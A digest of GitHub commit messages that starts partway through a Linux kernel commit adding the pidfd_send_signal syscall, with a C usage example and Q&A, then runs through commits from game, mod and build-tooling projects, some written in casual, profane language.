/* testing */
This patch was tested on x64 and x86.

/* userspace usage */
An asciinema recording for the basic functionality can be found under [9].
With this patch a process can be killed via:

 #define _GNU_SOURCE
 #include <errno.h>
 #include <fcntl.h>
 #include <signal.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 #include <sys/stat.h>
 #include <sys/syscall.h>
 #include <sys/types.h>
 #include <unistd.h>

 static inline int do_pidfd_send_signal(int pidfd, int sig, siginfo_t *info,
                                         unsigned int flags)
 {
 #ifdef __NR_pidfd_send_signal
         return syscall(__NR_pidfd_send_signal, pidfd, sig, info, flags);
 #else
         return -ENOSYS;
 #endif
 }

 int main(int argc, char *argv[])
 {
         int fd, ret, saved_errno, sig;

         if (argc < 3)
                 exit(EXIT_FAILURE);

         fd = open(argv[1], O_DIRECTORY | O_CLOEXEC);
         if (fd < 0) {
                 printf("%s - Failed to open \"%s\"\n", strerror(errno), argv[1]);
                 exit(EXIT_FAILURE);
         }

         sig = atoi(argv[2]);

         printf("Sending signal %d to process %s\n", sig, argv[1]);
         ret = do_pidfd_send_signal(fd, sig, NULL, 0);

         saved_errno = errno;
         close(fd);
         errno = saved_errno;

         if (ret < 0) {
                 printf("%s - Failed to send signal %d to process %s\n",
                        strerror(errno), sig, argv[1]);
                 exit(EXIT_FAILURE);
         }

         exit(EXIT_SUCCESS);
 }

/* Q&A
 * Given that it seems the same questions get asked again by people who are
 * late to the party it makes sense to add a Q&A section to the commit
 * message so it's hopefully easier to avoid duplicate threads.
 *
 * For the sake of progress please consider these arguments settled unless
 * there is a new point that desperately needs to be addressed. Please make
 * sure to check the links to the threads in this commit message whether
 * this has not already been covered.
 */
Q-01: (Florian Weimer [20], Andrew Morton [21])
      What happens when the target process has exited?
A-01: Sending the signal will fail with ESRCH (cf. [22]).

Q-02:  (Andrew Morton [21])
       Is the task_struct pinned by the fd?
A-02:  No. A reference to struct pid is kept. struct pid - as far as I
       understand - was created exactly for the reason to not require to
       pin struct task_struct (cf. [22]).

Q-03: (Andrew Morton [21])
      Does the entire procfs directory remain visible? Just one entry
      within it?
A-03: The same thing that happens right now when you hold a file descriptor
      to /proc/<pid> open (cf. [22]).

Q-04: (Andrew Morton [21])
      Does the pid remain reserved?
A-04: No. This patchset guarantees a stable handle not that pids are not
      recycled (cf. [22]).

Q-05: (Andrew Morton [21])
      Do attempts to signal that fd return errors?
A-05: See {Q,A}-01.

Q-06: (Andrew Morton [22])
      Is there a cleaner way of obtaining the fd? Another syscall perhaps.
A-06: Userspace can already trivially retrieve file descriptors from procfs
      so this is something that we will need to support anyway. Hence,
      there's no immediate need to add another syscalls just to make
      pidfd_send_signal() not dependent on the presence of procfs. However,
      adding a syscalls to get such file descriptors is planned for a
      future patchset (cf. [22]).

Q-07: (Andrew Morton [21] and others)
      This fd-for-a-process sounds like a handy thing and people may well
      think up other uses for it in the future, probably unrelated to
      signals. Are the code and the interface designed to permit such
      future applications?
A-07: Yes (cf. [22]).

Q-08: (Andrew Morton [21] and others)
      Now I think about it, why a new syscall? This thing is looking
      rather like an ioctl?
A-08: This has been extensively discussed. It was agreed that a syscall is
      preferred for a variety or reasons. Here are just a few taken from
      prior threads. Syscalls are safer than ioctl()s especially when
      signaling to fds. Processes are a core kernel concept so a syscall
      seems more appropriate. The layout of the syscall with its four
      arguments would require the addition of a custom struct for the
      ioctl() thereby causing at least the same amount or even more
      complexity for userspace than a simple syscall. The new syscall will
      replace multiple other pid-based syscalls (see description above).
      The file-descriptors-for-processes concept introduced with this
      syscall will be extended with other syscalls in the future. See also
      [22], [23] and various other threads already linked in here.

Q-09: (Florian Weimer [24])
      What happens if you use the new interface with an O_PATH descriptor?
A-09:
      pidfds opened as O_PATH fds cannot be used to send signals to a
      process (cf. [2]). Signaling processes through pidfds is the
      equivalent of writing to a file. Thus, this is not an operation that
      operates "purely at the file descriptor level" as required by the
      open(2) manpage. See also [4].

/* References */
[1]:  https://lore.kernel.org/lkml/20181029221037.87724-1-dancol@google.com/
[2]:  https://lore.kernel.org/lkml/874lbtjvtd.fsf@oldenburg2.str.redhat.com/
[3]:  https://lore.kernel.org/lkml/20181204132604.aspfupwjgjx6fhva@brauner.io/
[4]:  https://lore.kernel.org/lkml/20181203180224.fkvw4kajtbvru2ku@brauner.io/
[5]:  https://lore.kernel.org/lkml/20181121213946.GA10795@mail.hallyn.com/
[6]:  https://lore.kernel.org/lkml/20181120103111.etlqp7zop34v6nv4@brauner.io/
[7]:  https://lore.kernel.org/lkml/36323361-90BD-41AF-AB5B-EE0D7BA02C21@amacapital.net/
[8]:  https://lore.kernel.org/lkml/87tvjxp8pc.fsf@xmission.com/
[9]:  https://asciinema.org/a/IQjuCHew6bnq1cr78yuMv16cy
[11]: https://lore.kernel.org/lkml/F53D6D38-3521-4C20-9034-5AF447DF62FF@amacapital.net/
[12]: https://lore.kernel.org/lkml/87zhtjn8ck.fsf@xmission.com/
[13]: https://lore.kernel.org/lkml/871s6u9z6u.fsf@xmission.com/
[14]: https://lore.kernel.org/lkml/20181206231742.xxi4ghn24z4h2qki@brauner.io/
[15]: https://lore.kernel.org/lkml/20181207003124.GA11160@mail.hallyn.com/
[16]: https://lore.kernel.org/lkml/20181207015423.4miorx43l3qhppfz@brauner.io/
[17]: https://lore.kernel.org/lkml/CAGXu5jL8PciZAXvOvCeCU3wKUEB_dU-O3q0tDw4uB_ojMvDEew@mail.gmail.com/
[18]: https://lore.kernel.org/lkml/20181206222746.GB9224@mail.hallyn.com/
[19]: https://lore.kernel.org/lkml/20181208054059.19813-1-christian@brauner.io/
[20]: https://lore.kernel.org/lkml/8736rebl9s.fsf@oldenburg.str.redhat.com/
[21]: https://lore.kernel.org/lkml/20181228152012.dbf0508c2508138efc5f2bbe@linux-foundation.org/
[22]: https://lore.kernel.org/lkml/20181228233725.722tdfgijxcssg76@brauner.io/
[23]: https://lwn.net/Articles/773459/
[24]: https://lore.kernel.org/lkml/8736rebl9s.fsf@oldenburg.str.redhat.com/
[25]: https://lore.kernel.org/lkml/CAK8P3a0ej9NcJM8wXNPbcGUyOUZYX+VLoDFdbenW3s3114oQZw@mail.gmail.com/

Cc: "Eric W. Biederman" <ebiederm@xmission.com>
Cc: Jann Horn <jannh@google.com>
Cc: Andy Lutomirsky <luto@kernel.org>
Cc: Andrew Morton <akpm@linux-foundation.org>
Cc: Oleg Nesterov <oleg@redhat.com>
Cc: Al Viro <viro@zeniv.linux.org.uk>
Cc: Florian Weimer <fweimer@redhat.com>
Signed-off-by: Christian Brauner <christian@brauner.io>
Reviewed-by: Tycho Andersen <tycho@tycho.ws>
Reviewed-by: Kees Cook <keescook@chromium.org>
Reviewed-by: David Howells <dhowells@redhat.com>
Acked-by: Arnd Bergmann <arnd@arndb.de>
Acked-by: Thomas Gleixner <tglx@linutronix.de>
Acked-by: Serge Hallyn <serge@hallyn.com>
Acked-by: Aleksa Sarai <cyphar@cyphar.com>

(cherry picked from commit 3eb39f47934f9d5a3027fe00d906a45fe3a15fad)

Conflicts:
        arch/x86/entry/syscalls/syscall_32.tbl - trivial manual merge
        arch/x86/entry/syscalls/syscall_64.tbl - trivial manual merge
        include/linux/proc_fs.h - trivial manual merge
        include/linux/syscalls.h - trivial manual merge
        include/uapi/asm-generic/unistd.h - trivial manual merge
        kernel/signal.c - struct kernel_siginfo does not exist in 4.14
        kernel/sys_ni.c - cond_syscall is used instead of COND_SYSCALL
        arch/x86/entry/syscalls/syscall_32.tbl
        arch/x86/entry/syscalls/syscall_64.tbl

(1. manual merges because of 4.14 differences
 2. change prepare_kill_siginfo() to use struct siginfo instead of
kernel_siginfo
 3. use copy_from_user() instead of copy_siginfo_from_user() in copy_siginfo_from_user_any()
 4. replaced COND_SYSCALL with cond_syscall
 5. Removed __ia32_sys_pidfd_send_signal in arch/x86/entry/syscalls/syscall_32.tbl.
 6. Replaced __x64_sys_pidfd_send_signal with sys_pidfd_send_signal in arch/x86/entry/syscalls/syscall_64.tbl.)

Bug: 135608568
Test: test program using syscall(__NR_pidfd_send_signal,..) to send SIGKILL
Change-Id: I34da11c63ac8cafb0353d9af24c820cef519ec27
Signed-off-by: Suren Baghdasaryan <surenb@google.com>
Signed-off-by: electimon <electimon@gmail.com>

---
## [ITIFSMTH/autoexchange](https://github.com/ITIFSMTH/autoexchange)@[824694fa9d...](https://github.com/ITIFSMTH/autoexchange/commit/824694fa9d1604fc7c2309097151c67c544e633a)
#### Tuesday 2022-11-22 16:14:06 by itifsmth

Man, listen. If you're reding this, it means that you need finish my work. I DON'T GIVE A FUCK WHAT I DO. No, really. There is so much fucking controllers, DB are so big. Now I've done a admin controllers (All in courses and editDirection*). Good luck with this shit.

---
## [igorescodro/alkaa](https://github.com/igorescodro/alkaa)@[858bdf6ab0...](https://github.com/igorescodro/alkaa/commit/858bdf6ab0028b03e3b4c479fc4b9aa23f2b1c49)
#### Tuesday 2022-11-22 16:34:12 by Igor Escodro

♻️ Refactor the NavGraph for better readability

I want to update all the navigation to be inside the same graph, similar
to the "Now in Android" app. However, my experience with that is pretty
annoying. For now, a simple refactor to break the graphs internally and
make it better to read is enough.

---
## [user5522/website](https://github.com/user5522/website)@[e42d4bb8cd...](https://github.com/user5522/website/commit/e42d4bb8cdfea294bb66f5c8091a6b0cd20c540a)
#### Tuesday 2022-11-22 16:52:29 by Username *

fuckiing vite bgro i hate it so much it's ass fuck vite each update it breaks my builds fucki ngg eazdfks!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! fuckers at vite shit fuck :!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! yeah

---
## [Skyrat-SS13/Skyrat-tg](https://github.com/Skyrat-SS13/Skyrat-tg)@[460ab7adf5...](https://github.com/Skyrat-SS13/Skyrat-tg/commit/460ab7adf560856148d46233e3cde565d05354a4)
#### Tuesday 2022-11-22 16:53:06 by SkyratBot

[MIRROR] JPS Optimization (Light Botcode) [MDB IGNORE] (#17669)

* JPS Optimization (Light Botcode) (#70623)

## About The Pull Request

Alright. So.
Right now, JPS works like this:
```
code requests path
we enter the actual pathfinding
pathfinding sleeps when it overruns a tick
if it sleeps, it'll then wake up before the mc starts
continue
```
This has annoying side effects. Primarily that we have no real control
over JPS, we just sorta have to eat its cost.
So if there's like 10 different things pathfinding at once, the mc will
have no time to do anything. Hell we might even end up eating into
maptick's time if the jps work is expensive enough (note the cost of
sleeping is not accounted for, and that has overhead)
This has happen before, usually when someone makes a lot of bots, and
it's really annoying.

So then, lets put JPS on a subsystem. That way the MC has control over
it.
But wait, existing code expects to yield and get back a path list, and
that's a sane request.
This is solvable, but requires abusing pass by reference lists, and the
ability to make callbacks into partials (preinsert arguments into them
before they're called, and accept other args later)

Because of this, we can now pass callbacks into pathfinders, allowing
for async use, rather then JUST yielding.

Of note: I've removed the 10 pathfinding datums limit, since
ratelimiting like that is handled nicely by the MC.
I've also removed the 15 second timeout, since mc yielding would trigger
it too often. I'm unsure if this means we don't have exit conditions for
pathfinding, need to talk to ryll. (@ Ryll-Ryll what happens if jps just
like, fails to find a path?)

Also of note: I think bots will fire off more then one pathfinding
attempt at a time if their first takes too long to complete. This is
dumb, why do we do this?

Optimizes JPS by more then 40% by removing redundant for(thing in turf)
loops, and avoiding making proc calls if objects are non dense.
This makes things slightly more fragile, but saves a LOT of time. I
think it's worth it, tho talking to mso it might be possible to do
better. Maybe I should do a LINDA system style thing. (I did a linda
system style thing I fixed it)

Optimizes botscanning, fixes bots not seeing things adjacent to them
The list of types could be a cached typecache
We could inline both checkscan and check_bot
check_bot SHOULD NOT BE CALLED ON EVERY OBJECT IN VIEW HOLY SHIT WHY
We don't need to process adjacent and the shuffled view separately, it's
in fact easier to process them in one block
Renames a var

Moves bot's pathing images to above most floor objects, so they're
visible in maint

## Why It's Good For The Game

Speed. Also manuel will stop killing their server by placing 20000
medibots (fucking icebox man every time)

## Changelog

:cl:
fix: Bots will now "notice" you if you're standing right next to them
fix: Bot paths will now draw above things like pipes, rather then below
them
refactor: Changed how pathfinding paths get generated
refactor: Made pathfinding and bot searching significantly faster
/:cl:

Co-authored-by: Mothblocks <35135081+Mothblocks@ users.noreply.github.com>

* JPS Optimization (Light Botcode)

Co-authored-by: LemonInTheDark <58055496+LemonInTheDark@users.noreply.github.com>
Co-authored-by: Mothblocks <35135081+Mothblocks@ users.noreply.github.com>

---
## [n0F4x/Prog3-NHF](https://github.com/n0F4x/Prog3-NHF)@[a1b3ef4125...](https://github.com/n0F4x/Prog3-NHF/commit/a1b3ef41259e3d926df5606a9167a6b08aa8187e)
#### Tuesday 2022-11-22 17:20:28 by Zsombor Szommer

IntelliJ generated useless stuff, fuck you InetlliJ

---
## [hashgraph/hedera-services](https://github.com/hashgraph/hedera-services)@[7c92fb7a26...](https://github.com/hashgraph/hedera-services/commit/7c92fb7a26afc39f9855d004c1a9144259111681)
#### Tuesday 2022-11-22 17:25:54 by David Bakin

Eliminate Immmutable* as being too much trouble

Turns out Immutable* are too much trouble.  They're especially hard to
read (as Java hasn't yet invented a replacement for type aliases (see
C/C++ `typedef`).  And they're not really necessary here as all users
of the results of these methods are friendly, none are going to
deliberately misuse the ability to modify these collections, and in
fact, there's no reason for them not to.  The attempt to achieve
clarity of semantics by letting the reader know that these data
structures are immutable and thus the reader doesn't have to worry
about keeping "current state" in mind is, in this case, not needed.
Reader can just figure that out on his own.

- So, guava immutable collections replaced by standard collections,
  and Apache ImmutablePair replaced by bespoke record type (which
  _also_ has the big advantage of being able to _name_ the components,
  I shouldn't have been seduced by ImmutablePair _especially_ that
  Java has record types - my bad).

Also, replaced uses in method return values of EntityNum by the actual
wrapped Long.  Nothing in this tool requires the full capabilities of
an EntityNum.  We're only interested in having the tags for the
contracts.

Signed-off-by: David Bakin <117694041+david-bakin-sl@users.noreply.github.com>

---
## [ChaosAwakens/ChaosAwakens](https://github.com/ChaosAwakens/ChaosAwakens)@[07d506be81...](https://github.com/ChaosAwakens/ChaosAwakens/commit/07d506be81c3e8e202f1a8978d5df25ec5e36136)
#### Tuesday 2022-11-22 18:39:05 by RaveTr

Junior dev shit, save your eyes

->DISCLAIMER<-
A BUNCH of the stuff written in this commit is W.I.P, meaning there's a
shit-load of comments and clunky ahh code. It functions, but is damn
torture to read. I'll refactor it in one of my near-future commits.

->CHANGELOG<-
- Reworked ground AI, targeting AI, slightly tweaked swimming AI.
- Added the extra attacks to the planned mobs.
- Added all planned items and blocks.
- Added particles, and datagen for those particles.
- Updated some stuff in the API package.
- Tweaked spawn rates for ores and mobs.
- Added a bunch more config stuff.
- Some mixin fixes and additions.
- More new assets.
- Added overhauled ent dungeons, currently only for Acacia, Birch, Dark
Oak, and Jungle.
- Added other planned features.
- Fixed incompatibilities with vanilla and other mods, such as the mob
battle mod.
- Tweaked worldgen.
- Read the code for the other technical stuff :skull:.

---
## [Yatiyaya/Sore-station](https://github.com/Yatiyaya/Sore-station)@[2290e12bed...](https://github.com/Yatiyaya/Sore-station/commit/2290e12bedf65b90c6cf5bf4a8d43fdb43335512)
#### Tuesday 2022-11-22 19:04:05 by WilsonWeave

More beacon fiddling, part TWO!! WOW! !EGHGHG!!!  (#4128)

* Sheet Snatchers Offers!! Wow!!

Makes Lancer station offer 300 credits for up to 4 sheet snatchers at a time, considering Solnishko buys many more knives at a time, for 150 each, this seems more than fair considering the effort  and materials involved. Also ain't no one cooking food for trade offers chief.

Also makes Boris station offer 400 credits for up to 2  guild made advanced sheet snatchers at a time.  Having literally only one, extremely niche and rare to obtain offer as the only offer for a station is a really bad idea. Might not make the most sense for this station, but I'll consider replacing it with something more fitting. Eventually. But it works for now.

* More beacon fiddling, part TWO!! WOW! !EGHGHG!!!

Makes the religion stations buy meat, not as much per slab as Dionis does (given it's a tier one, roundstart station), but they can buy more at a time based on RNG.

Gives meat and all of it's sub-types a base price of 20 credits (hopefully)

Ghost-kitchen, AKA the VERY under utilized chef station now buys dinner trays. Slightly cheaper than knives. But I may change this to be more profitable than knives, albeit very restricted in number sold at a time, given it's one steel PLUS a tool-step. (Though honestly, I think I'm gonna tone back kitchen knife sales to 100, at LEAST, here soon.)

BUG FIX!!! Casino station no longer has an unlisted secret inventory, it now correctly displays, and gives a name to the extra tab. TODO! Make rigsuits more expensive overall, because you're paying a premium for a usually inferior rigsuit. (And voidsuits suits on that note). Oh and make it so the gems are properly sold for a million credits instead of twenty or two hundred million credits.

Casino station now buys cardboard boxes. For the meantime, it's plain cardboard boxes, while it's supposed to be a rebate, the boxes used for the Casino sales are a special subtype that include a LOT of non-box special objects. It works as an alternate favor method for now.

Brings a few more kitchen dishes up to closer par with roach-meat burgers. Vermouth pays FIVE HUNDRED credits for certain types of roach burgers roundstart. Bacon is a somewhat limited resource, and a pain to cook, so it should a LEAST be closer to roach meat. Effected stations are the trash refining station and the bluespace station.

---
## [TrashDoxx/TG](https://github.com/TrashDoxx/TG)@[0747099063...](https://github.com/TrashDoxx/TG/commit/074709906301e3e396179c861ca0af068c3f36ec)
#### Tuesday 2022-11-22 19:16:51 by RikuTheKiller

Adds a reagent injector component and BCI manipulators to all circuit labs (#71236)

<!-- Write **BELOW** The Headers and **ABOVE** The comments else it may
not be viewable. -->
<!-- You can view Contributing.MD for a detailed description of the pull
request process. -->

## About The Pull Request

This PR adds a reagent injector component that's exclusive to BCIs.
(Requested to be integrated into BCIs by Mothblocks.)
When outside of a circuit, the component itself stores the reagents.
However, if it's inside of a BCI, the storage is moved to the BCI. The
storage can contain up to 15u of reagents and acts like an open
container. (However, it won't spill even if you throw it, it just acts
like an open container code-wise, don't worry about it.)
You can only have one reagent injector in a circuit. Trying to insert
multiple will give you an error message.
The entire dose is administered at once. (Requirement set by
Mothblocks.)

Please don't try to dispute any of the specific limitations in the
comments as they're out of my control. They're reasonable anyways.

Reagent Injector Input/Output:
Inject (Input Signal) - Administers all reagents currently stored inside
of the BCI into the user.
Injected (Output Signal) - Triggered when reagents are injected. Not
triggered if the reagent storage is empty.

New BCI Input:
Show Charge Meter (Number) - Toggles showing the charge meter action.
(Adds some capacity for stealth.)

Install Detector Outputs: (Added following a comment about having to use
weird workarounds for proper loops.)
Current State (Number) - Outputs 1 if the BCI is implanted and 0 if it's
not.
Installed (Signal) - Triggered when the BCI is implanted into it's user.
Removed (Signal) - Triggered when the BCI is removed from it's user.

This PR also adds BCI manipulation chambers to all currently present
circuit labs. (Solution proposed by Mothblocks.)
Yes I had to do some other mapping changes to allow for this. No I don't
have any mapping experience, why do you ask?

<!-- Describe The Pull Request. Please be sure every change is
documented or this can delay review and even discourage maintainers from
merging your PR! -->

## Why It's Good For The Game

One small step for BCIs, one giant leap for circuit kind. (First
"proper" circuit to human interaction in the entire game!)

This allows for some funky stuff and also makes it less of a pain in the
ass to use BCIs. What's not to love?

<!-- Argue for the merits of your changes and how they benefit the game,
especially if they are controversial and/or far reaching. If you can't
actually explain WHY what you are doing will improve the game, then it
probably isn't good for the game in the first place. -->

## Changelog

<!-- If your PR modifies aspects of the game that can be concretely
observed by players or admins you should add a changelog. If your change
does NOT meet this description, remove this section. Be sure to properly
mark your PRs to prevent unnecessary GBP loss. You can read up on GBP
and it's effects on PRs in the tgstation guides for contributors. Please
note that maintainers freely reserve the right to remove and add tags
should they deem it appropriate. You can attempt to finagle the system
all you want, but it's best to shoot for clear communication right off
the bat. -->

:cl:
add: Added a reagent injector component and BCI manipulators to all
circuit labs. (+ install detector component)
/:cl:

<!-- Both :cl:'s are required for the changelog to work! You can put
your name to the right of the first :cl: if you want to overwrite your
GitHub username as author ingame. -->
<!-- You can use multiple of the same prefix (they're only used for the
icon ingame) and delete the unneeded ones. Despite some of the tags,
changelogs should generally represent how a player might be affected by
the changes rather than a summary of the PR's contents. -->

Co-authored-by: Mothblocks <35135081+Mothblocks@users.noreply.github.com>

---
## [TrashDoxx/TG](https://github.com/TrashDoxx/TG)@[bf582cb833...](https://github.com/TrashDoxx/TG/commit/bf582cb833d89b7121b4fefa37e8da1773783245)
#### Tuesday 2022-11-22 19:16:51 by Profakos

Trophy case update (#71015)

## About The Pull Request

I have been chipping away/procrastinating at this since May, but after
several years, I have finally updated how Trophy Cases work.

So, what this PR does is the following:

- Standardized everything in persistence.dm to use snake case, and added
basic autodocs
- Automatically moves trophies from data/npc_saves/TrophyItems.json to
data/trophy_items.json. Removed legacy .sav conversion by request, it
has been a long time.
- Trophy cases are opened and loaded the same way you would open a
regular ID locked display case (used curator access, relevant access
autodoc has been updated)
- Instead of cheap plastic replicas that turn to dust anyways, trophy
cases use holograms, which can be dispelled by hand
- Trophy data gets saved if an item stays in the trophy case when the
shuttle arrives to centcom, and the item has a description set. This is
in line with paintings, which has to still hang on the wall at round
end.
- You can edit the description of new trophies by using the librarian's
key to unlock History Mode
- When you click on a closed trophy case, it will open a tgui, and will
not display the case description. It will still do for open cases.
Vendatrays have been updated to do the same.
- The UI's icon uses icon2base64(getFlatIcon(showpiece, no_anim=TRUE)).
Vendatrays have been updated similarly, so items with directions and
animations are displayed properly. The base64 strings are updated in
update_static_data.
- Fixes vendatrays from displaying some characters in strange ways, such
as displaying /improper.
- Renames some one letter, or nonindicate argument and var names in
trophy case code
- Adds a trophy management admin panel, where admins can finally delete
all the curator ID cards swallowed over the years. Or, they can replace
the paths with funny new paths.
- If an entry has an incorrect, no longer existing path, it will be
marked red in the management panel
- Adds MAX_PLAQUE_LEN define, which 144 characters
- Removes start_showpieces from trophy cases, as it was completely
unused. The start_showpiece_type var is still around.
- Moves trophy_message var to trophy cases. Only a dice collector
display case used them in the Snowdin map.

What this PR does not do

- Sadly, it still only saves the base image of an item, and no layers or
altered image states. This has to come in the future.

<details>
<summary>Click here to see various states of the trophy tgUI</summary>
 

![kép](https://user-images.githubusercontent.com/2676196/199545412-e5b7e7a8-59fb-41e6-aca5-6b07ba33501c.png)
Locked history mode, existing item.


![kép](https://user-images.githubusercontent.com/2676196/199545574-9e705603-9b7a-457d-9575-2d4145ad940d.png)
Unlocked history mode, but holographic trophy is present.


![kép](https://user-images.githubusercontent.com/2676196/199545883-45c3916b-011f-462a-8296-6eb13db32158.png)
Locked history mode, no item.


![kép](https://user-images.githubusercontent.com/2676196/199545967-a33e2501-aa5f-473b-b79f-ebd950df2afc.png)
Unlocked history mode, no item.


![kép](https://user-images.githubusercontent.com/2676196/199546100-718bd639-3199-4df7-ad77-ed3dbf27b290.png)
Unlocked history mode, item placed, default text. (Note: this picture is
out of date. The typo has been fixed, and "record a message" is now
"record a description" for consistency)
 

![kép](https://user-images.githubusercontent.com/2676196/199546202-5ebbbd28-907c-4f2d-b7cd-29d2ef21c7f3.png)
Unlocked history mode, item placed, new text.

</details>

<details>
<summary>Click here to see the admin panel</summary>


![kép](https://user-images.githubusercontent.com/2676196/199553349-8684f23f-4699-42f2-a27e-15cccad29d0b.png)


</details>

## Why It's Good For The Game

Less curator ID's stuck in the Trophy Cases, and the existing ones can
be cleaned up. A more immersive Trophy Case user experience, in general.

## Changelog


:cl:
refactor: refactored trophy cases, to be more user friendly
admin: created a trophy managment admin panel
/:cl:

---
## [TrashDoxx/TG](https://github.com/TrashDoxx/TG)@[bbb956d2a6...](https://github.com/TrashDoxx/TG/commit/bbb956d2a670656e546c35a09ec27295e5e06e94)
#### Tuesday 2022-11-22 19:16:51 by OrionTheFox

Removes Bowls from garbage spawners because they don't fit in trash bags and I'm SICK of not being able to clean! (#71152)

## About The Pull Request
Let me give you a scenario.

---

THIS, is you. Say hi!

![image](https://user-images.githubusercontent.com/76465278/200268480-9dcf1f45-3bc5-402d-b743-b0649deefb08.png)

You're a loyal janitor aboard NT-SS13. You love your job; despite the
dangers, it's generally not too busy or tedious. Just a spray, a sweep,
and put it all in a bag.

---

This. This is your enemy.

![image](https://user-images.githubusercontent.com/76465278/200269058-957ca433-4666-44b5-9c10-ae0da75219cb.png)

Some crewmembers continuously leave them in maintenance, tossing them
into garbage bins as they pass.
This bowl, you cannot spray it. You can sweep it as far as you want, but
in the end, cannot put it into the bag.

![image](https://user-images.githubusercontent.com/76465278/200269156-bbc7758b-9cbe-4a3b-8d17-9aa53254b4b2.png)

---

It exists to torment you.
Nothing more, nothing less.

You hate the bowl. And it hates you.
Wake up.

![image](https://user-images.githubusercontent.com/76465278/200269456-a7fda598-3556-4069-bd2a-44a8793c198f.png)
## Why It's Good For The Game
Usually when you pass a trash pile you expect it to have trash, and
entire bowls aren't technically trash code-wise, nor can you clean them.
Yes, this PR has a modicum of salt. It was salt left behind in THE DAMN
BOWLS.
## Changelog
:cl:
del: NT has decided to begin a Recycling initiative, asking crew to
please stop throwing their bowls away in maintenance. You should only
find trash and grime from now on!
/:cl:

---
## [TrashDoxx/TG](https://github.com/TrashDoxx/TG)@[c1f0141967...](https://github.com/TrashDoxx/TG/commit/c1f01419671ad084a6c048ec7900d008de53bfe2)
#### Tuesday 2022-11-22 19:16:51 by LemonInTheDark

Fixes mineral turfs having weird lighting (#71219)

## About The Pull Request

Pixel offsets, unlike transforms, offset overlays too. this was breaking
lighting overlays for mineral walls.

We did pixel offsets to save on init time, but we can acomplish the same
thing using an initial matrix. It's static, so there's no additional
cost. S free

Damn moth

## Changelog
:cl:
fix: Mining walls won't have fucked lighting anymore
/:cl:

---
## [tgstation/tgstation](https://github.com/tgstation/tgstation)@[7d04edb6e2...](https://github.com/tgstation/tgstation/commit/7d04edb6e2927330906a7af89664b7a5ab3aa48c)
#### Tuesday 2022-11-22 19:33:30 by Profakos

Mail sorting helper, and disposals fixes (#70861)

## About The Pull Request


![image](https://user-images.githubusercontent.com/2676196/198695007-53db1b70-845f-46a9-b98a-e146bb53951b.png)

This PR adds a mail sorting map helper, which during Late Initialization
will apply a sorting location index to the mail sorting disposals pipe
under them. I have replaced the varedits with all mail sorters with the
appropriate map helpers. I have thoroughly tested this, making sure
packages arrived to every location, where possible.

I have also fixed a few issues with the disposals network:

**Tramstation**

- One of the random maintenance segments had a place with no disposal
pipes. This has been fixed
- A sorter was looking for chapel and library packages, but it actually
meant to look for engineering packages
- There was no dormitory mail sorter, I have added one

**Metastation**

- There was no dormitory mail sorter, I have added one

**Icebox**

- There is no experimentor lab in icebox, but there is an
"experimentation" lab, which is good enough, so I have added it as a
location

**Deltastation**

- There was no dormitory mail sorter, I have added one
- Virology was not connected to the disposals network. However, on every
other map, it has a one way connection. I have hooked it up just like
that, so virology mail will arrive safely, and virology trash will go
into space as usual.

**Kilostation**

- Genetics packages were rerouted to the psychologist office

Unsolved issue on kilostation: there is no experimentor on this station,
and there is no space for a disposals in the circuits lab, so sadly, if
you send a package to this destination, it will come back to the mail
sorting office.

**Future improvements**

The TAGGERLOCATIONS list, which is used to retrieve the labels of the
various tags, is frankly unorganizable, and hard to expand. I have
delayed fixing this for a future PR.

I kinda wish to remove the sortType variable, as it is no longer
necessary to have it around with these helpers, but sadly, this would
ruin downstream maps, so I have no plans for this at the moment.

## Why It's Good For The Game

While mapping, having to constantly compare a comment in flavor_misc.dm
to figure out what to varedit a disposal mail sorter to is rather
annoying. These map helpers, similar to the access helpers, will help
with this issue.

Its also good if mail actually arrives.

## Changelog


:cl:
qol: added a mail sorting map helper, to allow mappers to create
disposal networks faster
fix: fixes several non working disposal mail targets that never received
their packages
/:cl:

---
## [NonpareilGaming/Lucio](https://github.com/NonpareilGaming/Lucio)@[946881fe88...](https://github.com/NonpareilGaming/Lucio/commit/946881fe88a0f42d3e92dd454e93b675af3bd16d)
#### Tuesday 2022-11-22 19:44:38 by Nick Benton

Fuck, I'm fucking tryin. I've nearly exhausted my 'white hat hacker attack vector' . Anyhow, gonna help a friend move a couch. But I can sleep on it

'

---
## [Pangoraw/Yggdrasil](https://github.com/Pangoraw/Yggdrasil)@[b1469b44df...](https://github.com/Pangoraw/Yggdrasil/commit/b1469b44df4c63961a6c0f0387a89ef4ef24aa26)
#### Tuesday 2022-11-22 19:55:42 by Elliot Saba

[GCCBootstrap_jll] Build using `crosstool-ng` (#4753)

In the beginning, I wanted to compile a nice little standalone `GCC_jll`
that could be hooked together with a `Glibc_jll` and a `Binutils_jll`,
and a `LinuxKernelHeaders_jll`, etc...  That work is sitting in [0] but
bootstrapping is such a giant pain in the neck that I wanted to give up
the complexity of bootstrapping to instead focus on simply building each
product in isolation.  This _vastly_ reduces the amount of work
necessary to get things working, but it introduces a new dependency: we
need a base C compiler and libc that are already compiled for the target
platform.  To be precise, we need a `build -> host` compiler in order to
build a `host -> target` compiler.  We already have one of those for all
of our current platforms, so I could generate `GCC_jll` packages, but
then when we want to add a new platform, we'd be in trouble.  For this
reason, I realized we'll never truly escape the bootstrapping problem.

I thought about reverting back to the bootstrapping configuration we've
had until now, but rebelled at the thought.  Then I discovered
crosstool-ng, and realized that I could separate concerns here: I can
use ct-ng to build a working cross-toolchain for each target, then use
that compiler to do a much simpler build for all of the other
components.  Therefore, I extract the work of getting a bootstrap build
onto crosstool-ng, and then use that to do whatever other builds I want
in the presence of a fully-functional cross-compiler.

This also breaks the need for the initial bootstrap to be quite as
restricted as the target toolchain.  The GCC that we build technically
doesn't need to run everywhere, it just needs to generate code that runs
everywhere.  We can build GCC against glibc 2.19, and then at build time
have it link the code it generates against glibc 2.12.2, and that will
work just fine for BB.  The compiler may be using a newer glibc to run,
but when it builds, it uses whatever glibc is placed within the target
